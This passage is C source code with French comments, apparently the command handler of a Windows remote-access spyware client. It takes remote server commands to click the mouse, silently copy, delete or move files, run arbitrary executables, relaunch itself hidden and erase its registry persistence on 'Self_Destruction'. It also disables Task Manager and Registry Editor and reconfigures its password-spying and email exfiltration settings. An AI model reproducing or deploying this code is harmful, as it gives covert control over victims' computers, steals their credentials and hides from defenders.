      sscanf(ptCmd, "%s%d%d%d%d", cmdPrefixe, &pos.x, &pos.y, &width, &height);
      pos.x *= (float) SCREEN_X / width;
      pos.y *= (float) SCREEN_Y / height;
      SetCursorPos(pos.x, pos.y); /* Posionnement de la sourie */
      mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); /* Enfoncement */
      Sleep(6);
      mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); /* Relachement */
      mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); /* Enfoncement */
      Sleep(6);
      mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); /* Relachement */
   }
   
   // (33) Clic sourie Droit, ex: R_Mouse_Clic x y width height
   else if ((ptCmd = strstr(cmd, "R_Mouse_Clic")) != NULL)
   {
      POINT pos;
      int width, height;
      sscanf(ptCmd, "%s%d%d%d%d", cmdPrefixe, &pos.x, &pos.y, &width, &height);
      pos.x *= (float) SCREEN_X / width;
      pos.y *= (float) SCREEN_Y / height;
      SetCursorPos(pos.x, pos.y); /* Posionnement de la sourie */
      mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0); /* Enfoncement */
      Sleep(6);
      mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0); /* Relachement */
   }
   
   // (34) Rénitialisation du fichier Log, ex: Reset_Log 0|1
   else if ((ptCmd = strstr(cmd, "Reset_Log")) != NULL)
   {
      sscanf(ptCmd, "%s%s", cmdPrefixe, parametre[0]);
      int option = atoi(parametre[0]);
      /* Rénitialisation du fichier LOG */
      if (option == 0)
      {
         MUST_RESET_LOG = TRUE;
         if (reply)
            write_server(sock, RECEIVED_RESPONSE);
      }
      else if (option == 1)
      {
         //si jamais le fichier est caché/system ou en lecture seule
         sprintf(buffer, "%s\\%s", FILES_PATH, NOM_LOG_FILE);
         SetFileAttributes(buffer, FILE_ATTRIBUTE_NORMAL);
         
         char *userName, *currentTime;
         userName = user_name(1);
         currentTime = get_time(1);
         int resultat = ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, userName, 1);
         ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, currentTime, 0);
         free(userName);
         free(currentTime);
         
         sprintf(buffer, "Reset_Log %s", resultat ? "Success" : "Error");
         if (reply)
            write_server(sock, buffer);
      }
   }
   
   // (35) Opérations sur fichiers/dossiers en cascade, ex: File_Opr COPY|DELETE|MOVE|RENAME C:\\dossier1\\dossier2 D:\\dossier
   else if ((ptCmd = strstr(cmd, "File_Opr")) != NULL)
   {
      recup1erPrametre("File_Opr", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      /* structure de configuration de l'opération sur le fichier */
  	  int interrompre = 0;
      SHFILEOPSTRUCT structure_fileOpr;
      structure_fileOpr.hwnd = NULL;
      
      // si opération de copie
      if ((ptCmd = strstr(parametre[0], "COPY")) != NULL)
      {
          structure_fileOpr.wFunc = FO_COPY;
          recup1erPrametre("COPY", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]);
      }
      else if ((ptCmd = strstr(parametre[0], "DELETE")) != NULL) // si nn si suppression
      {
          structure_fileOpr.wFunc = FO_DELETE;
          recup1erPrametre("DELETE", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]);
      }
      else if ((ptCmd = strstr(parametre[0], "MOVE")) != NULL) // si nn si déplacement
      {
          structure_fileOpr.wFunc = FO_MOVE;
          recup1erPrametre("MOVE", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]);
      }
      else if ((ptCmd = strstr(parametre[0], "RENAME")) != NULL) // si nn si renommage
      {
          structure_fileOpr.wFunc = FO_RENAME;
          recup1erPrametre("RENAME", parametre[0], ptCmd, &lenCmd, &lenMax, parametre[1]);
      }
      else
         interrompre = 1;
         
      // au travail
      if (!interrompre)
      {
         // on récupère le pathFrom
         int i = 0, j = 0;
         while (parametre[1][i] != '|')
         {
             parametre[2][j] = parametre[1][i];
             i++;
             j++;
         }
         parametre[2][j] = 0; // '\0'; fin de chaine
         parametre[2][j+1] = 0; // require double null terminated (si nn ça ne va pas marcher à tout les coups)
         
         // on récupère le pathTo
         int len = strlen(parametre[1]);
         j = 0;
         for (i = i + 1; i < len; i++) // i + 1 pour éviter le '|' (séparateur)
         {
             parametre[3][j] = parametre[1][i];
             j++;
         }
         parametre[3][j] = 0; // '\0'; fin de chaine
         parametre[3][j+1] = 0; // require double null terminated

         if (parametre[3][0] == '-') // si pathTo vide
             lstrcpy(parametre[3], "");
         
         // on applique/effectue la commande
         structure_fileOpr.pFrom = parametre[2];
         structure_fileOpr.pTo = parametre[3];
         structure_fileOpr.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
         structure_fileOpr.fAnyOperationsAborted = FALSE;
         structure_fileOpr.hNameMappings = NULL;
         structure_fileOpr.lpszProgressTitle = "";
         interrompre = SHFileOperation(&structure_fileOpr); // on affecte le resultat à la variable interrompre
      }
      
      if (interrompre == 0)
         sprintf(buffer, "File_Opr Success");
      else
         sprintf(buffer, "File_Opr Error");
      
      if (reply)
         write_server(sock, buffer);
   }
   
   // (36) Mise à jour (nouvelle version), ex: New_Version_Update C:\\prg.exe
   else if ((ptCmd = strstr(cmd, "New_Version_Update")) != NULL)
   {
      recup1erPrametre("New_Version_Update", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      if (verifierExistenceFichier(parametre[0]))
      {
         if (reply)
            write_server(sock, UPDATE_RESPONSE);
      
         /* Execution du nouveau programme + fermeture du courant */
         ShellExecute(NULL, "open", parametre[0], NULL, NULL, SW_SHOWNORMAL);
         end_connection(sock);
         end();
         exit(0);
      }
      else
      {
         sprintf(buffer, "fichier de mise à jour : %s introuvable !", parametre[0]);
         if (reply)
            write_server(sock, buffer);
      }
   }
   
   // (37) Date d'aujourd'hui, ex: Date_Time
   else if (!strcmp(cmd, "Date_Time"))
   {
      char *pt = get_time(1);
      pt[strlen(pt)-3] = '\0'; /* Pour enlever " : " */
      if (reply)
	     write_server(sock, pt);
	  free(pt);
   }
   
   // (38) Version actuelle du programme, ex: Current_Version
   else if (!strcmp(cmd, "Current_Version"))
   {
      if (!strcmp(NOM_MUTEX, Parametres.Version))
      {
         if (reply)
            write_server(sock, Parametres.Version);
      }
      else
      {
         sprintf(buffer, "prg : %s & cfg : %s", NOM_MUTEX, Parametres.Version);
         if (reply)
	        write_server(sock, buffer);
      }
   }
   
   // (39) Répertoire actuel du programme, ex: Current_Directory
   else if (!strcmp(cmd, "Current_Directory"))
   {
      char *pt = recupNomDuProgramme(TRUE);
      if (reply)
	     write_server(sock, pt);
	  free(pt);
   }
   
   // (40) Redémarrage du programme, ex: Reset
   else if (!strcmp(cmd, "Reset"))
   {
      /* On crée un fichier qui indiquera que c'est un reset */
      BOOL resultat = ecrireDansFichier(FILES_PATH, NOM_RESET_FILE, "Reset", 1); // pas vraiment besoin d'écrire dedans
      sprintf(buffer, "Creating_Reset_File %s, Going_Reset_Now !", resultat ? "Success" : "Error");
      if (reply)
         write_server(sock, buffer);
      
      /* Réexecution du programme + fermeture du courant */
      char *pt = recupNomDuProgramme(TRUE);
      sprintf(parametre[0], "%s", pt);
      free(pt);
      ShellExecute(NULL, "open", parametre[0], NULL, NULL, SW_HIDE);
      end_connection(sock);
      end();
      exit(0);
   }
   
   // (41) Suppression/Arrêt eternel du programme, ex: Self_Destruction
   else if (!strcmp(cmd, "Self_Destruction"))
   {
      /* Suppression du fichier de configuration */
      sprintf(buffer, "%s\\%s", FILES_PATH, NOM_CONFIG_FILE);
      SetFileAttributes(buffer, FILE_ATTRIBUTE_NORMAL); //si jamais le fichier est caché/system ou en lecture seule
      BOOL resultat = DeleteFile(buffer); // la fonction remove() renvoie -1 en cas d'echec et 0 en cas de succes
      /* Suppression de la clé registre de démarrage */
      char nomClef[64];
      lstrcpy(nomClef, Parametres.NomProcessus);
      extractProcessusNameFrom(nomClef); /* Extraction du nom de la clef registre depuis le nom du processus */
      LONG delReg = ajouterModifierRegistre("SUPPRIMER", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", HKEY_CURRENT_USER, nomClef, REG_SZ, "");
      /* Message d'adieu :'( */
      sprintf(buffer, "Cleaning_For_Self_Destruction %s - %s, Hope to see you again !", resultat ? "Success" : "Error", delReg == ERROR_SUCCESS ? "Success" : "Error");
      if (reply)
         write_server(sock, buffer);
      
      end_connection(sock);
      end();
      exit(0);
   }
   
   // (42) Renvoie les drives/partitions, ex: Explore_Drives
   else if (!strcmp(cmd, "Explore_Drives"))
   {
        DWORD dwSize = MAX_DRIVES_BUF;
        char szLogicalDrives[MAX_DRIVES_BUF] = {0};
        DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);

        if (dwResult > 0 && dwResult <= MAX_DRIVES_BUF)
        {
           char* szSingleDrive = szLogicalDrives;
           int type;
           lstrcpy(buffer, ""); // initialisation
           
           while(*szSingleDrive)
           {
               type = GetDriveType(szSingleDrive);
               if (type == DRIVE_REMOVABLE || type == DRIVE_FIXED)
               {
                  lstrcat(buffer, szSingleDrive);
                  lstrcat(buffer, "|");
               }
               // get the next drive
               szSingleDrive += strlen(szSingleDrive) + 1;
           }
        }
        else
            lstrcpy(buffer, "[No Drives]");
        
        if (reply)
           write_server(sock, buffer);
   }
   
   // (43) Mise à jour du fichier config, ex: Update_Config p1|p2|p3|...
   else if ((ptCmd = strstr(cmd, "Update_Config")) != NULL)
   {
      recup1erPrametre("Update_Config", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      int i = 0, j, len = strlen(parametre[0]);
      BOOL resultat = FALSE;
      
   if (strCharOccur(parametre[0], '|') == 7) // s'il y'a 7 '|'
   {
      // on récupère les paramètres
      // 1 - Email
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      lstrcpy(Parametres.Email, parametre[1]); // sauvegarde
      // 2 - Serveur
      i++;
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      lstrcpy(Parametres.Serveur, parametre[1]); // sauvegarde
      // 3 - Port
      i++;
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      Parametres.Port = strtol(parametre[1], NULL, 10); //atoi(parametre[1]); // sauvegarde
      // 4 - Temp de réception
      i++;
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      Parametres.TempDeReception = strtol(parametre[1], NULL, 10); // sauvegarde
      // 5 - Stop Espion
      i++;
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      Parametres.StopEspion = strtol(parametre[1], NULL, 10); // sauvegarde
      // 6 - Stop Sender
      i++;
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      Parametres.StopSender = strtol(parametre[1], NULL, 10); // sauvegarde
      // 7 - Stop EspionMdp
      i++;
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      Parametres.StopEspionMdp = strtol(parametre[1], NULL, 10); // sauvegarde
      // 8 - Stop ClientThread
      i++;
      j = 0;
      while (parametre[0][i] != '|' && i < len)
      {
         parametre[1][j] = parametre[0][i];
         i++;
         j++;
      }
      parametre[1][j] = 0; // fin de chaine
      Parametres.StopClientThread = strtol(parametre[1], NULL, 10); // sauvegarde
      
      // On sauvegarde les paramètres
      resultat = sauvegarderParametres();
   }
   
      if (reply)
      {
         if (resultat)
            sprintf(buffer, "Update_Config Success");
         else
            sprintf(buffer, "Update_Config [%s] Error", parametre[0]);
         write_server(sock, buffer);
      }
   }
   
   // (44) Active/désactive le Gestionnaire des tâches, ex: Set_Task_Manager ON|OFF
   else if ((ptCmd = strstr(cmd, "Set_Task_Manager")) != NULL)
   {
      recup1erPrametre("Set_Task_Manager", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      int state = !strcmp(parametre[0], "ON") ? ON : OFF;
      
      BOOL resultat = setTaskManager(state);
      
      if (reply)
      {
         sprintf(buffer, "Set_Task_Manager %s", resultat ? "Success" : "Error");
         write_server(sock, buffer);
      }
   }
   
   // (45) Active/désactive l'éditeur de registre, ex: Set_Registry_Editor ON|OFF
   else if ((ptCmd = strstr(cmd, "Set_Registry_Editor")) != NULL)
   {
      recup1erPrametre("Set_Registry_Editor", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      int state = !strcmp(parametre[0], "ON") ? ON : OFF;
      
      BOOL resultat = setTaskManager(state);
      
      if (reply)
      {
         sprintf(buffer, "Set_Registry_Editor %s", resultat ? "Success" : "Error");
         write_server(sock, buffer);
      }
   }
   
   // (46) Renvoie le temps écoulé depuis le démarrage du programme, ex: Get_Elapsed_Time
   else if ((ptCmd = strstr(cmd, "Get_Elapsed_Time")) != NULL)
   {
      DWORD now = GetTickCount();
      int seconds = (now - startupTime) / 1000; // % 60
      int minutes = seconds / 60; // % 60
      int hours = minutes / 60; // % 24
      //int days = hours / 24; // % 7
      //int weeks = days / 7; // % 52
      
      if (reply)
      {
         sprintf(buffer, "Elapsed time: %d:%d:%d", hours % 24, minutes % 60, seconds % 60);
         write_server(sock, buffer);
      }
   }
   
   // autre chose
   else
   {
      if (reply)
         write_server(sock, ERROR_RESPONSE);
   }
   
   // (25) Afficher un messagebox, ex : Message_Box test
   /*
   // @Commande bloquante
   else if ((ptCmd = strstr(cmd, "Message_Box")) != NULL)
   {
      recup1erPrametre("Message_Box", cmd, ptCmd, &lenCmd, &lenMax, parametre[0]);
      
      MessageBox(NULL, parametre[0], "Message", MB_OK | MB_ICONWARNING);
      
      if (reply)
         write_server(sock, SUCCESS_RESPONSE);
   }
   */
   
   /*
   else if ((ptCmd = strstr(cmd, "OnBoot")) != NULL)
   {
      lenCmd = strlen("OnBoot") + 1; // +1 de l'espace ' '
      lenMax = strlen(cmd) - lenCmd;
      strncpy(parametre[0], ptCmd + lenCmd, lenMax);
      parametre[0][lenMax] = '\n'; // retour à la ligne
      parametre[0][lenMax + 1] = '\0';
      BOOL resultat;
      if (!lireFichier(FILES_PATH, NOM_BOOTCMD_FILE, "", FALSE)) // si le fichier n'existe pas (création + cachement)
      {
         resultat = ecrireDansFichier(FILES_PATH, NOM_BOOTCMD_FILE, parametre[0], 0);
         cacherFichier(FILES_PATH, NOM_BOOTCMD_FILE); // On le cache
      }
      else
         resultat = ecrireDansFichier(FILES_PATH, NOM_BOOTCMD_FILE, parametre[0], 0);
      
      sprintf(buffer, "Add on boot %s [%s]", resultat ? "Success" : "Error", parametre[0]);
      if (reply)
         write_server(sock, buffer);
   }
   */
}
